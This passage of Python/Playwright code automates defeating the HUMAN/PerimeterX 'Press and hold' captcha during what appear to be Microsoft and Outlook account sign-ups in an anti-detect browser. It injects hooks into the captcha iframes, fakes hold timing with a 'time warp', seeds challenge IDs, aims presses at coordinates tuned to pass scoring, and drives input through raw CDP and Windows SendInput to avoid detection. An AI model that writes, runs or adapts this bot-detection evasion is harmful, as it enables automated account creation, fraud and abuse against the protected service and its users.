                        } else if (action === "stop" && typeof window.__pxProbeTimeWarpStop === "function") {
                          window.__pxProbeTimeWarpStop("direct_stop", stopDelayMs);
                          direct = true;
                        }
                        if (!direct) {
                          window.postMessage({
                            __pxProbeTimeWarpCommand: {
                              action,
                              holdMs,
                              wallMs,
                              stopDelayMs,
                              reason: "message_" + action
                            }
                          }, "*");
                        }
                        let state = null;
                        try {
                          if (typeof window.__pxProbeTimeWarpState === "function") state = window.__pxProbeTimeWarpState();
                        } catch (_) {}
                        return {ok: true, href: location.href, direct, state, posted: !direct};
                      } catch (e) {
                        return {ok: false, href: location.href, error: String(e && e.message || e)};
                      }
                    }""",
                    {"action": action, "holdMs": int(hold_ms), "wallMs": int(wall_ms), "stopDelayMs": int(stop_delay_ms)},
                )
                if res and res.get("ok"):
                    results.append({
                        "idx": idx,
                        "href": (res.get("href") or "")[:100],
                        "state": res.get("state") or res.get("posted"),
                        "direct": res.get("direct"),
                    })
                else:
                    failures.append({"idx": idx, "res": res})
            except Exception:
                failures.append({"idx": idx, "error": "evaluate_exception"})
                continue
        print(f"[Probe] time_warp_hold broadcast {action}: posted_frames={len(results)} failures={len(failures)}")
        for item in results[:8]:
            print(f"  frame[{item['idx']}] {item['href']} direct={item.get('direct')} state={item.get('state')}")
        for item in failures[:5]:
            print(f"  miss frame[{item['idx']}] {str(item.get('res') or item.get('error'))[:220]}")
        page.wait_for_timeout(60)
        return results

    def broadcast_knp_prestart(reason):
        results = []
        failures = []
        for idx, frame in enumerate(page.frames):
            try:
                frame_url = frame.url or ""
                if not frame_in_scope(frame_url):
                    continue
                res = frame.evaluate(
                    """({reason}) => {
                      try {
                        let direct = false;
                        let prestarted = false;
                        let qi = "";
                        if (typeof window.__pxProbeKnpPrestartLatest === "function") {
                          prestarted = !!window.__pxProbeKnpPrestartLatest(reason || "direct");
                          direct = true;
                        } else {
                          window.postMessage({ __pxProbeKnpPrestart: { reason: reason || "message" } }, "*");
                        }
                        let ready = false;
                        let readySource = "";
                        let hasEn = false;
                        try {
                          const s = window.__pxProbe || {};
                          qi = String(
                            s.lastChallengeQi ||
                            s.externalChallengeQi ||
                            s.lastCollectorQi ||
                            s.lastCollectorQiHint ||
                            ""
                          );
                          const exact = qi && s.knpByQi && s.knpByQi[qi];
                          const fallback = qi && s.fallbackKnpByQi && s.fallbackKnpByQi[qi];
                          const data = exact || fallback || null;
                          ready = !!data;
                          readySource = exact ? "exact_qi" : (fallback ? "fallback_qi" : "");
                          hasEn = !!(data && data["U0MpSRYgLHo="] && data["U0MpSRYgLHo="].en);
                        } catch (_) {}
                        return {
                          ok: true,
                          href: location.href,
                          isChctx: String(location.href || "").indexOf("ch_ctx=1") >= 0,
                          direct,
                          prestarted,
                          qi,
                          ready,
                          readySource,
                          hasEn
                        };
                      } catch (e) {
                        return {ok: false, href: location.href, error: String(e && e.message || e)};
                      }
                    }""",
                    {"reason": reason},
                )
                if res and res.get("ok"):
                    results.append({
                        "idx": idx,
                        "href": (res.get("href") or "")[:100],
                        "isChctx": res.get("isChctx"),
                        "direct": res.get("direct"),
                        "prestarted": res.get("prestarted"),
                        "qi": res.get("qi"),
                        "ready": res.get("ready"),
                        "readySource": res.get("readySource"),
                        "hasEn": res.get("hasEn"),
                    })
                else:
                    failures.append({"idx": idx, "res": res})
            except Exception:
                failures.append({"idx": idx, "error": "evaluate_exception"})
                continue
        prestart_count = sum(1 for item in results if item.get("prestarted"))
        ready_count = sum(
            1
            for item in results
            if item.get("ready") and item.get("hasEn") and item.get("readySource") == "exact_qi"
        )
        print(
            f"[Probe] knp prestart {reason}: frames={len(results)} "
            f"prestarted={prestart_count} ready={ready_count} failures={len(failures)}"
        )
        for item in results[:6]:
            print(
                f"  knp frame[{item['idx']}] {item['href']} chctx={item.get('isChctx')} "
                f"direct={item.get('direct')} prestarted={item.get('prestarted')} "
                f"ready={item.get('ready')} hasEn={item.get('hasEn')} "
                f"source={item.get('readySource') or '-'} qi={item.get('qi') or '-'}"
            )
        for item in failures[:3]:
            print(f"  knp miss frame[{item['idx']}] {str(item.get('res') or item.get('error'))[:180]}")
        page.wait_for_timeout(40)
        return results

    def captcha_close_failed_frame():
        try:
            for frame in page.frames:
                url = str(getattr(frame, "url", "") or "")
                if "iframe.hsprotect.net/px/captcha_close" in url and "status=-1" in url:
                    return url[:180]
        except Exception:
            return ""
        return ""

    def collector_capture_hint(preferred_qi: str = ""):
        try:
            capture_state = getattr(page, "_pxprobe_collector_capture", None) or {}
        except Exception:
            capture_state = {}
        if not isinstance(capture_state, dict):
            return None

        preferred_qi = str(preferred_qi or "")

        def usable(item, want_body: bool = False):
            if not isinstance(item, dict):
                return False
            qi = str(item.get("qi") or "")
            if not qi or qi == "1604064986000":
                return False
            if preferred_qi and qi != preferred_qi:
                return False
            if want_body and not item.get("body"):
                return False
            return True

        if preferred_qi:
            for item in reversed(list(capture_state.get("items") or [])):
                if usable(item, want_body=True):
                    return item
            for item in reversed(list(capture_state.get("responses") or [])):
                if usable(item):
                    return item
            last = capture_state.get("last") or {}
            if isinstance(last, dict):
                hint = {
                    "qi": preferred_qi,
                    "uuid": last.get("uuid") or "",
                    "appId": last.get("appId") or "PXzC5j78di",
                    "seq": "",
                    "rsc": "",
                    "tags": [],
                }
                return hint
            return {"qi": preferred_qi, "appId": "PXzC5j78di"}

        last = capture_state.get("last")
        if usable(last):
            return last
        for item in reversed(list(capture_state.get("items") or [])):
            if usable(item, want_body=True):
                return item
        return None

    def install_late_runtime_hook(hint_qi: str = "", reason: str = "late"):
        if not runtime_hook_js:
            print("[Probe] late runtime hook skipped: no hook js")
            return []
        capture_hint = collector_capture_hint(hint_qi)
        hinted_qi = str((capture_hint or {}).get("qi") or "")
        results = []
        failures = []
        for idx, frame in enumerate(page.frames):
            try:
                frame_url = frame.url or ""
                if not frame_in_scope(frame_url):
                    continue
                res = frame.evaluate(
                    """({hook, hint}) => {
                      try {
                        if (!window.__pxProbeInstalled) {
                          (0, eval)(String(hook || ""));
                        }
                        if (hint && hint.qi && window.__pxProbe) {
                          try {
                            const s = window.__pxProbe;
                            const qi = String(hint.qi || "");
                            const text = (() => {
                              try { return String(document && document.body && document.body.innerText || ""); } catch (_) { return ""; }
                            })();
                            const isChallengeFrame = String(location.href || "").indexOf("ch_ctx=1") >= 0 || /Human Challenge|按住|Press and hold/i.test(text);
                            s.lastCollectorQiHint = qi;
                            s.lastCollectorQi = qi;
                            if (isChallengeFrame) {
                              s.externalChallengeQi = qi;
                              s.lastChallengeQi = qi;
                            }
                            if (hint.body) s.lastCollectorBody = String(hint.body || "");
                            s.knpMetaByQi = s.knpMetaByQi || {};
                            s.knpMetaByQi[qi] = {
                              uuid: hint.uuid || "",
                              appId: hint.appId || "PXzC5j78di"
                            };
                            try {
                              s.events = s.events || [];
                              s.events.push({
                                t: Date.now(),
                                perf: (performance && performance.now ? performance.now() : 0),
                                href: location.href,
                                kind: "external_collector_qi_hint",
                                data: {
                                  qi,
                                  seq: hint.seq || "",
                                  rsc: hint.rsc || "",
                                  tags: hint.tags || [],
                                  isChallengeFrame
                                }
                              });
                            } catch (_) {}
                          } catch (_) {}
                        }
                        return {
                          ok: true,
                          href: location.href,
                          isChctx: String(location.href || "").indexOf("ch_ctx=1") >= 0,
                          installed: !!window.__pxProbeInstalled,
                          hasTimeWarp: typeof window.__pxProbeTimeWarpStart === "function",
                          hasKnpPrestart: typeof window.__pxProbeKnpPrestartLatest === "function",
                          hintedQi: window.__pxProbe && window.__pxProbe.lastCollectorQiHint || ""
                        };
                      } catch (e) {
                        return {ok: false, href: location.href, error: String(e && e.message || e)};
                      }
                    }""",
                    {"hook": runtime_hook_js, "hint": capture_hint or {}},
                )
                if res and res.get("ok"):
                    results.append({
                        "idx": idx,
                        "href": (res.get("href") or "")[:100],
                        "installed": res.get("installed"),
                        "hasTimeWarp": res.get("hasTimeWarp"),
                        "hasKnpPrestart": res.get("hasKnpPrestart"),
                        "isChctx": res.get("isChctx"),
                        "hintedQi": res.get("hintedQi"),
                    })
                else:
                    failures.append({"idx": idx, "res": res})
            except Exception as exc:
                failures.append({"idx": idx, "error": repr(exc)[:160]})
        ok_count = sum(1 for item in results if item.get("installed"))
        print(
            f"[Probe] late runtime hook install: frames={len(results)} ok={ok_count} "
            f"failures={len(failures)} reason={reason} hint_qi={hinted_qi}"
        )
        for item in results[:8]:
            print(
                f"  runtime frame[{item['idx']}] {item['href']} "
                f"chctx={item.get('isChctx')} timeWarp={item.get('hasTimeWarp')} knp={item.get('hasKnpPrestart')} qi={item.get('hintedQi')}"
            )
        for item in failures[:5]:
            print(f"  runtime miss frame[{item['idx']}] {str(item.get('res') or item.get('error'))[:220]}")
        page.wait_for_timeout(80)
        return results

    def prehold_readiness_snapshot(stable_qi: str = "", stable_since: float | None = None):
        """Small first-hold readiness snapshot.

        This intentionally stays observational: it does not rewrite requests or
        force callbacks.  The goal is to avoid pressing during the noisy first
        challenge bootstrap window where Y1NZ/captcha assets/ch_ctx frames are
        still settling.
        """
        now = time.time()
        try:
            capture_state = getattr(page, "_pxprobe_collector_capture", None) or {}
        except Exception:
            capture_state = {}
        try:
            scoped_frames = []
            chctx_frames = 0
            for frame in page.frames:
                href = str(getattr(frame, "url", "") or "")
                if not frame_in_scope(href):
                    continue
                scoped_frames.append(href[:96])
                if "ch_ctx=1" in href:
                    chctx_frames += 1
        except Exception:
            scoped_frames = []
            chctx_frames = 0

        responses = list((capture_state.get("responses") if isinstance(capture_state, dict) else []) or [])
        signals = list((capture_state.get("signals") if isinstance(capture_state, dict) else []) or [])
        last = capture_state.get("last") if isinstance(capture_state, dict) else None
        last_qi = str((last or {}).get("qi") or "")
        preferred_qi = str(runtime_active_qi_hint or "")
        current_qi = preferred_qi or last_qi
        current_qi_source = "runtime_hint" if preferred_qi else "collector_last"
        current_resp = last if last_qi == current_qi else None
        if not current_resp and current_qi:
            for resp in reversed(responses[-16:]):
                try:
                    if str(resp.get("qi") or "") == current_qi:
                        current_resp = resp
                        break
                except Exception:
                    continue
        if current_qi and current_qi == stable_qi and stable_since:
            qi_stable_ms = int((now - stable_since) * 1000)
        else:
            qi_stable_ms = 0

        y1nz_ready = any(
            str(resp.get("qi") or "") == current_qi
            and "Y1NZWSUzXWs=" in [str(x) for x in (resp.get("tags") or [])]
            and int(resp.get("status") or 0) == 200
            for resp in responses[-12:]
        )
        captcha_js_ok = any(
            sig.get("label") == "captcha_js"
            and sig.get("phase") == "response"
            and int(sig.get("status") or 0) == 200
            for sig in signals[-20:]
        )
        iframe_ok = any(
            sig.get("label") == "hsprotect_iframe"
            and sig.get("phase") == "response"
            and int(sig.get("status") or 0) == 200
            for sig in signals[-20:]
        )
        loaded_ages = [
            int((now - float(sig.get("seen_at") or now)) * 1000)
            for sig in signals[-20:]
            if sig.get("label") == "HumanCaptcha_Loaded"
        ]
        loaded_seen = bool(loaded_ages)
        loaded_age_ms = max(loaded_ages) if loaded_ages else 0
        failure_seen = any(sig.get("label") == "HumanCaptcha_Failure" for sig in signals[-20:])
        success_seen = any(sig.get("label") == "HumanCaptcha_Success" for sig in signals[-20:])
        pending = int((capture_state.get("collector_pending") if isinstance(capture_state, dict) else 0) or 0)
        recent_labels = [
            {
                "label": sig.get("label"),
                "phase": sig.get("phase"),
                "age_ms": int((now - float(sig.get("seen_at") or now)) * 1000),
                **({"status": sig.get("status")} if sig.get("status") is not None else {}),
            }
            for sig in signals[-8:]
        ]
        return {
            "current_qi": current_qi,
            "current_qi_source": current_qi_source,
            "last_seq": str((current_resp or last or {}).get("seq") or ""),
            "last_tags": list((current_resp or last or {}).get("tags") or []),
            "qi_stable_ms": qi_stable_ms,
            "collector_pending": pending,
            "scoped_frames": len(scoped_frames),
            "chctx_frames": chctx_frames,
            "y1nz_ready": y1nz_ready,
            "captcha_js_ok": captcha_js_ok,
            "iframe_ok": iframe_ok,
            "loaded_seen": loaded_seen,
            "loaded_age_ms": loaded_age_ms,
            "failure_seen": failure_seen,
            "success_seen": success_seen,
            "recent_signals": recent_labels,
        }

    def wait_prehold_readiness():
        budget_ms = max(0, int(prehold_readiness_gate_ms or 0))
        if budget_ms <= 0:
            return {}
        start = time.time()
        deadline = start + budget_ms / 1000.0
        loaded_min_age_ms = max(0, int(prehold_loaded_min_age_ms or 0))
        stable_qi = ""
        stable_since = None
        last_print_at = 0.0
        final_snap = {}
        while True:
            try:
                capture_state = getattr(page, "_pxprobe_collector_capture", None) or {}
                last = capture_state.get("last") if isinstance(capture_state, dict) else None
                qi_now = str(runtime_active_qi_hint or ((last or {}).get("qi") or ""))
                if qi_now and qi_now != stable_qi:
                    stable_qi = qi_now
                    stable_since = time.time()
                elif qi_now and stable_since is None:
                    stable_since = time.time()
            except Exception:
                qi_now = ""
            snap = prehold_readiness_snapshot(stable_qi, stable_since)
            elapsed_ms = int((time.time() - start) * 1000)
            # A bounded minimum dwell is deliberate: the failure cluster often
            # occurs when the first real button is pressed immediately after
            # the bootstrap Y1NZ, even if the proof later looks structurally OK.
            min_elapsed_ms = min(1100, max(450, budget_ms // 2))
            if loaded_min_age_ms > 0:
                asset_ready = bool(snap.get("loaded_seen")) and int(snap.get("loaded_age_ms") or 0) >= loaded_min_age_ms
            else:
                asset_ready = bool(snap.get("loaded_seen") or snap.get("captcha_js_ok"))
            ready = (
                elapsed_ms >= min_elapsed_ms
                and bool(snap.get("current_qi"))
                and int(snap.get("qi_stable_ms") or 0) >= 550
                and int(snap.get("collector_pending") or 0) == 0
                and (
                    int(snap.get("chctx_frames") or 0) >= 1
                    and int(snap.get("scoped_frames") or 0) >= 6
                )
                and bool(snap.get("y1nz_ready"))
                and asset_ready
                and not bool(snap.get("failure_seen"))
            )
            final_snap = {**snap, "elapsed_ms": elapsed_ms, "ready": ready, "budget_ms": budget_ms}
            now = time.time()
            if ready or now >= deadline:
                break
            if now - last_print_at >= 0.65:
                last_print_at = now
                print("[Probe] prehold readiness waiting " + json.dumps(final_snap, ensure_ascii=False)[:1000])
            page.wait_for_timeout(140)
        print("[Probe] prehold readiness final " + json.dumps(final_snap, ensure_ascii=False)[:1400])
        return final_snap

    print(
        f"[Probe] time_warp_hold: locating hold button; "
        f"fake_hold_ms={hold_ms} wall_ms={wall_ms} stop_delay_ms={stop_delay_ms} "
        f"prewait_ms={prewait_ms} pre_down_dwell_ms={pre_down_dwell_ms} frame_scope={frame_scope} install_mode={install_mode} "
        f"skip_mid_snapshots={skip_mid_snapshots} attempts_left={attempts}"
    )
    deadline = time.time() + max(1000, wait_before_ms) / 1000
    target, box = None, None
    while time.time() < deadline:
        try:
            s1 = score1_detected()
            if s1:
                print(f"[Probe] time_warp_hold: aborting before hold because score|1 detected: {s1}")
                return False
            target, box = controller._locate_hold_button(page)
            if box:
                break
            state = controller._captcha_finished_or_blocked(page)
            if state == "finished":
                return True
            if state == "blocked":
                return False
        except Exception:
            pass
        page.wait_for_timeout(220)
    if not box:
        print("[Probe] time_warp_hold: unable to locate hold button")
        return False

    if str(box.get("_px_source") or "").startswith("layout"):
        # The text-derived rectangle is correct, but on fresh hsprotect loads it
        # can appear a moment before the nested about:blank button is actually
        # ready to receive pointer events.  Wait briefly for a real role=button
        # locator so short accelerated holds do not get lost before PX1200.
        print(f"[Probe] time_warp_hold: initial target is {box.get('_px_source')}; waiting for real button")
        # Slow nodes can load captcha.js several seconds after the instruction
        # text is visible.  Pressing the text-derived fallback before the real
        # nested role=button has mounted produces dirty short traces (missing
        # Knp/BFA or early close=-1).  Give the actual button a longer bounded
        # window, then abort guarded 1s runs instead of consuming a bad attempt.
        real_deadline = time.time() + max(1000, int(real_target_wait_ms or 12000)) / 1000.0
        while time.time() < real_deadline:
            try:
                page.wait_for_timeout(220)
                target2, box2 = controller._locate_hold_button(page)
                if box2 and not str(box2.get("_px_source") or "").startswith("layout"):
                    target, box = target2, box2
                    print(f"[Probe] time_warp_hold: upgraded to real target box={box}")
                    break
            except Exception:
                pass
        if str(box.get("_px_source") or "").startswith("layout") and (
            int(min_runtime_hook_ready_frames or 0) > 0 or int(min_knp_prestart_ok or 0) > 0
        ):
            print(
                "[Probe] time_warp_hold: aborting guarded short hold because only layout target "
                "was available after waiting for the real nested button"
            )
            return False

    # Successful captures cluster a bit left of our original center press.
    # Using the same page target fraction brings PX1200 local/absolute coords
    # close to the known-good distribution while still staying inside button.
    x = box["x"] + box["width"] * 0.385
    y = box["y"] + box["height"] * 0.56
    print(f"[Probe] time_warp_hold target=({x:.1f},{y:.1f}) box={box}")

    if prewait_ms and prewait_ms > 0:
        # Keep the UI untouched while late hsprotect/crcldu telemetry finishes.
        # Successful full-hold traces include the KnpQcG8ZVUI= sandbox signal in
        # the same final collector POST as the captcha-completion events.  The
        # one-second time-warp runs often beat that callback and send the proof
        # alone, which the collector returns as oIIoIooo|-1.  Waiting here still
        # skips the long UI hold but lets the auxiliary proof material queue up.
        print(f"[Probe] time_warp_hold: pre-waiting {int(prewait_ms)}ms before short hold")
        deadline_wait = time.time() + int(prewait_ms) / 1000
        while time.time() < deadline_wait:
            try:
                s1 = score1_detected()
                if s1:
                    print(f"[Probe] time_warp_hold: aborting during prewait because score|1 detected: {s1}")
                    return False
                state = controller._captcha_finished_or_blocked(page)
                if state == "finished":
                    return True
                if state == "blocked":
                    return False
            except Exception:
                pass
            page.wait_for_timeout(min(500, max(50, int((deadline_wait - time.time()) * 1000))))

        # The outer iframe becomes visible before hsprotect finishes mounting
        # the real nested hold button.  If we lock the fallback iframe rectangle
        # too early, the later mouse stream can land outside the actual button
        # and the proof scores as a failed attempt.  Re-locate once after the
        # pre-wait so the short proof hold targets the final inner frame when it
        # exists.
        try:
            target2, box2 = controller._locate_hold_button(page)
            if box2:
                target, box = target2, box2
                x = box["x"] + box["width"] * 0.385
                y = box["y"] + box["height"] * 0.56
                print(f"[Probe] time_warp_hold retarget=({x:.1f},{y:.1f}) box={box}")
        except Exception:
            pass

    if install_runtime_hook_late:
        runtime_results = []
        min_ready = max(0, int(min_runtime_hook_ready_frames or 0))
        max_tries = max(1, int(prehold_hook_guard_retries or 0) + 1)
        for guard_try in range(max_tries):
            runtime_results = install_late_runtime_hook(reason=f"pre_readiness_guard_{guard_try + 1}")
            hinted_qi = choose_runtime_active_qi(runtime_results)
            if hinted_qi and hinted_qi != runtime_active_qi_hint:
                runtime_active_qi_hint = hinted_qi
                print(f"[Probe] runtime active qi hint={runtime_active_qi_hint}")
            eligible_runtime = sum(1 for item in runtime_results if (not require_chctx_runtime_ready or item.get("isChctx")))
            effective_min_ready = min_ready if min_ready else 0
            ready = sum(
                1
                for item in runtime_results
                if item.get("installed") and item.get("hasTimeWarp") and item.get("hasKnpPrestart")
                and (not require_chctx_runtime_ready or item.get("isChctx"))
            )
            if not effective_min_ready or ready >= effective_min_ready:
                break
            print(
                "[Probe] prehold hook guard: runtime hook not ready "
                f"ready={ready}/{effective_min_ready} configured_min={min_ready} "
                f"eligible={eligible_runtime} try={guard_try + 1}/{max_tries}; waiting before reinstall"
            )
            page.wait_for_timeout(450 + guard_try * 300)
        if min_ready:
            eligible_runtime = sum(1 for item in runtime_results if (not require_chctx_runtime_ready or item.get("isChctx")))
            effective_min_ready = min_ready
            ready = sum(
                1
                for item in runtime_results
                if item.get("installed") and item.get("hasTimeWarp") and item.get("hasKnpPrestart")
                and (not require_chctx_runtime_ready or item.get("isChctx"))
            )
            if ready < effective_min_ready:
                ready_label = "ch_ctx runtime" if require_chctx_runtime_ready else "runtime"
                print(
                    "[Probe] prehold hook guard: aborting before mouse input "
                    f"because {ready_label} hook coverage is too low "
                    f"ready={ready}/{effective_min_ready} configured_min={min_ready} eligible={eligible_runtime}"
                )
                return False

    if install_mode == "late":
        install_late_time_warp()

    prehold_ready = wait_prehold_readiness()
    active_score_qi = str((prehold_ready or {}).get("current_qi") or "")
    if int(prehold_readiness_gate_ms or 0) > 0 and prehold_ready and not prehold_ready.get("ready"):
        print(
            "[Probe] prehold readiness gate: aborting before mouse input "
            + json.dumps(prehold_ready, ensure_ascii=False)[:1400]
        )
        return False

    if install_runtime_hook_late and active_score_qi:
        # The collector can produce a side challenge after the active ch_ctx frame
        # has already stabilized.  Re-seed the hook with the readiness-confirmed qi
        # so KNP prestart and final normalization do not follow a later score|1 qi.
        install_late_runtime_hook(active_score_qi, reason="active_prehold_qi")

    if not skip_mid_snapshots:
        try:
            before_path, before_data = save_probe_state(page, out_dir, email, mode, "before_time_warp")
            print(f"[Probe] saved before_time_warp: {before_path}")
            summarize_probe(before_data)
        except Exception as exc:
            print(f"[Probe] time_warp_hold before save failed: {exc!r}")

    try:
        page.bring_to_front()
    except Exception:
        pass

    try:
        s1 = score1_detected(active_score_qi)
        if s1:
            print(f"[Probe] time_warp_hold: aborting before input because score|1 detected: {s1}")
            return False
        try:
            controller._human_move_to(page, x, y)
        except Exception:
            page.mouse.move(x, y)
        cdp_hold = None
        if legacy_short_hold_input and not hybrid_legacy_down_cdp_move_up and not hybrid_legacy_down_cdp_move_legacy_up:
            print("[Probe] time_warp_hold: legacy short-hold input enabled; using page.mouse pressed jitter path")
        else:
            try:
                cdp_hold = page.context.new_cdp_session(page)
            except Exception as exc:
                cdp_hold = None
                print(f"[Probe] time_warp_hold: CDP input unavailable, using page.mouse hold path: {exc!r}")
        if hybrid_legacy_down_cdp_move_up:
            print("[Probe] time_warp_hold: hybrid input enabled; page.mouse down + CDP move/up")
        if hybrid_legacy_down_cdp_move_legacy_up:
            print("[Probe] time_warp_hold: hybrid input enabled; page.mouse down/up + CDP move")
        if int(hybrid_page_move_count or 0) > 0:
            print(f"[Probe] time_warp_hold: hybrid page.mouse move budget={int(hybrid_page_move_count)}")
            if hybrid_page_move_for_click:
                print("[Probe] time_warp_hold: budgeted page.mouse moves will use private forClick=true path")
            if hybrid_page_move_no_reply:
                print("[Probe] time_warp_hold: budgeted page.mouse moves will use send_no_reply fire-and-forget")
        if oopif_cdp_hold_input:
            print(
                "[Probe] time_warp_hold: OOPIF raw-CDP input requested "
                f"endpoint={raw_cdp_endpoint} no_wait={bool(oopif_cdp_no_wait)}"
            )
        if native_sendinput_hold_input:
            print("[Probe] time_warp_hold: native Windows SendInput hold input enabled")
        async_raw_cdp_release_ms = int(async_raw_cdp_release_ms or 0)
        if async_raw_cdp_release_ms > 0:
            if raw_cdp_endpoint:
                print(
                    "[Probe] time_warp_hold: async raw-CDP release enabled "
                    f"delay_ms={async_raw_cdp_release_ms} endpoint={raw_cdp_endpoint}"
                )
            else:
                print("[Probe] time_warp_hold: async raw-CDP release requested but no CDP endpoint is available")

        hold_input_timings = []
        page_mouse_move_used = 0
        async_release_started = False
        async_release_thread = None
        oopif_sender = None
        oopif_frame_box = None

        class OopifInputSender:
            def __init__(self, endpoint, prefer_ch_ctx=True):
                import urllib.request
                import websocket

                self.endpoint = str(endpoint).rstrip("/")
                self.urllib_request = urllib.request
                self.websocket = websocket
                self.ws = None
                self.session_id = None
                self.target = None
                self.next_id = 1
                version = json.loads(
                    self.urllib_request.urlopen(self.endpoint + "/json/version", timeout=5)
                    .read()
                    .decode("utf-8", "replace")
                )
                self.ws = self.websocket.create_connection(
                    version["webSocketDebuggerUrl"],
                    timeout=5,
                    suppress_origin=True,
                )
                targets = self._send_browser("Target.getTargets").get("result", {}).get("targetInfos", [])
                candidates = [
                    t for t in targets
                    if t.get("type") == "iframe" and "iframe.hsprotect.net" in str(t.get("url") or "")
                ]
                if prefer_ch_ctx:
                    chosen = next((t for t in candidates if "ch_ctx=1" in str(t.get("url") or "")), None)
                else:
                    chosen = None
                if not chosen and candidates:
                    chosen = candidates[-1]
                if not chosen:
                    raise RuntimeError("no hsprotect iframe target found")
                self.target = chosen
                attached = self._send_browser(
                    "Target.attachToTarget",
                    {"targetId": chosen["targetId"], "flatten": True},
                )
                self.session_id = attached.get("result", {}).get("sessionId")
                if not self.session_id:
                    raise RuntimeError(f"attachToTarget returned no sessionId: {attached}")

            def _send_browser(self, method, params=None, no_wait=False, session_id=None):
                msg = {"id": self.next_id, "method": method}
                if params is not None:
                    msg["params"] = params
                if session_id:
                    msg["sessionId"] = session_id
                my_id = self.next_id
                self.next_id += 1
                self.ws.send(json.dumps(msg))
                if no_wait:
                    return {"no_wait": True, "id": my_id}
                while True:
                    resp = json.loads(self.ws.recv())
                    if resp.get("id") == my_id:
                        return resp

            def evaluate(self, expression):
                return self._send_browser(
                    "Runtime.evaluate",
                    {"expression": expression, "returnByValue": True, "awaitPromise": True},
                    session_id=self.session_id,
                )

            def dispatch_mouse(self, evt, local_x, local_y, no_wait=False):
                payload = dict(evt)
                payload["x"] = float(local_x)
                payload["y"] = float(local_y)
                payload.setdefault("timestamp", time.time())
                if int(payload.get("buttons") or 0) > 0:
                    payload.setdefault("force", 0.5)
                return self._send_browser(
                    "Input.dispatchMouseEvent",
                    payload,
                    no_wait=no_wait,
                    session_id=self.session_id,
                )

            def close(self):
                try:
                    self.ws.close()
                except Exception:
                    pass

        def locate_oopif_frame_box():
            selectors = [
                'iframe[src*="iframe.hsprotect.net"][src*="ch_ctx=1"]',
                'iframe[src*="iframe.hsprotect.net"]',
                'iframe[data-testid="humanCaptchaIframe"]',
            ]
            for sel in selectors:
                try:
                    loc = page.locator(sel)
                    cnt = loc.count()
                    for idx in range(cnt):
                        try:
                            box0 = loc.nth(idx).bounding_box(timeout=1000)
                        except Exception:
                            box0 = None
                        if box0:
                            return {"selector": sel, "index": idx, **box0}
                except Exception:
                    continue
            return None

        if oopif_cdp_hold_input and raw_cdp_endpoint:
            try:
                oopif_sender = OopifInputSender(raw_cdp_endpoint)
                oopif_frame_box = locate_oopif_frame_box()
                try:
                    eval_res = oopif_sender.evaluate(
                        "() => ({href: location.href, inner: [innerWidth, innerHeight], ready: document.readyState, text: (document.body && document.body.innerText || '').slice(0, 160)})"
                    )
                    eval_val = eval_res.get("result", {}).get("result", {}).get("value")
                except Exception as exc:
                    eval_val = {"error": repr(exc)}
                print(
                    "[Probe] OOPIF input attached "
                    f"target={str((oopif_sender.target or {}).get('url') or '')[:140]} "
                    f"frame_box={oopif_frame_box} eval={eval_val}"
                )
            except Exception as exc:
                print(f"[Probe] OOPIF input attach failed; falling back to normal input: {exc!r}")
                oopif_sender = None

        native_mouse = None
        if native_sendinput_hold_input:
            try:
                import ctypes

                class NativeSendInputMouse:
                    MOUSEEVENTF_MOVE = 0x0001
                    MOUSEEVENTF_LEFTDOWN = 0x0002
                    MOUSEEVENTF_LEFTUP = 0x0004
                    SW_RESTORE = 9

                    def __init__(self, page_obj):
                        self.user32 = ctypes.windll.user32
                        self.page = page_obj
                        self.geom = self._read_geom()
                        self.hwnd = self._find_browser_hwnd()
                        fg0 = self._foreground_info()
                        focused = self._focus_browser_window()
                        fg1 = self._foreground_info()
                        print(
                            f"[Probe] native_sendinput geom={self.geom} "
                            f"hwnd={hex(self.hwnd) if self.hwnd else None} "
                            f"focus_ok={focused} fg_before={fg0} fg_after={fg1}"
                        )

                    def _read_geom(self):
                        try:
                            return self.page.evaluate(
                                """() => ({
                                  screenX: window.screenX || 0,
                                  screenY: window.screenY || 0,
                                  outerWidth: window.outerWidth || 0,
                                  outerHeight: window.outerHeight || 0,
                                  innerWidth: window.innerWidth || 0,
                                  innerHeight: window.innerHeight || 0,
                                  dpr: window.devicePixelRatio || 1,
                                  vv: window.visualViewport ? {
                                    width: window.visualViewport.width,
                                    height: window.visualViewport.height,
                                    offsetLeft: window.visualViewport.offsetLeft,
                                    offsetTop: window.visualViewport.offsetTop
                                  } : null
                                })"""
                            )
                        except Exception:
                            return {}

                    def _window_text(self, hwnd):
                        try:
                            buf = ctypes.create_unicode_buffer(512)
                            self.user32.GetWindowTextW(hwnd, buf, 512)
                            return buf.value
                        except Exception:
                            return ""

                    def _window_class(self, hwnd):
                        try:
                            buf = ctypes.create_unicode_buffer(256)
                            self.user32.GetClassNameW(hwnd, buf, 256)
                            return buf.value
                        except Exception:
                            return ""

                    def _foreground_info(self):
                        try:
                            hwnd = self.user32.GetForegroundWindow()
                            return {
                                "hwnd": hex(hwnd) if hwnd else None,
                                "title": self._window_text(hwnd)[:120] if hwnd else "",
                                "class": self._window_class(hwnd) if hwnd else "",
                            }
                        except Exception as exc:
                            return {"error": repr(exc)}

                    def _find_browser_hwnd(self):
                        try:
                            import ctypes.wintypes as wt

                            matches = []
                            enum_proc_t = ctypes.WINFUNCTYPE(ctypes.c_bool, wt.HWND, wt.LPARAM)

                            def cb(hwnd, _lparam):
                                try:
                                    if not self.user32.IsWindowVisible(hwnd):
                                        return True
                                    title = self._window_text(hwnd)
                                    cls = self._window_class(hwnd)
                                    if cls == "Chrome_WidgetWin_1" and (
                                        "SunBrowser" in title
                                        or "outlook测试" in title
                                        or "Let's prove" in title
                                        or "Microsoft account" in title
                                        or "Create account" in title
                                    ):
                                        matches.append((hwnd, title, cls))
                                except Exception:
                                    pass
                                return True

                            self.user32.EnumWindows(enum_proc_t(cb), 0)
                            # Prefer the actual AdsPower/SunBrowser window over a normal Chrome/Edge tab.
                            for hwnd, title, _cls in matches:
                                if "SunBrowser" in title:
                                    return int(hwnd)
                            if matches:
                                return int(matches[0][0])
                        except Exception:
                            pass
                        return 0

                    def _focus_browser_window(self):
                        if not self.hwnd:
                            return False
                        ok = False
                        try:
                            self.user32.ShowWindow(self.hwnd, self.SW_RESTORE)
                        except Exception:
                            pass
                        for _ in range(3):
                            try:
                                ok = bool(self.user32.SetForegroundWindow(self.hwnd)) or ok
                                self.user32.BringWindowToTop(self.hwnd)
                                self.user32.SetFocus(self.hwnd)
                            except Exception:
                                pass
                            try:
                                if self.user32.GetForegroundWindow() == self.hwnd:
                                    return True
                            except Exception:
                                pass
                            time.sleep(0.05)
                        try:
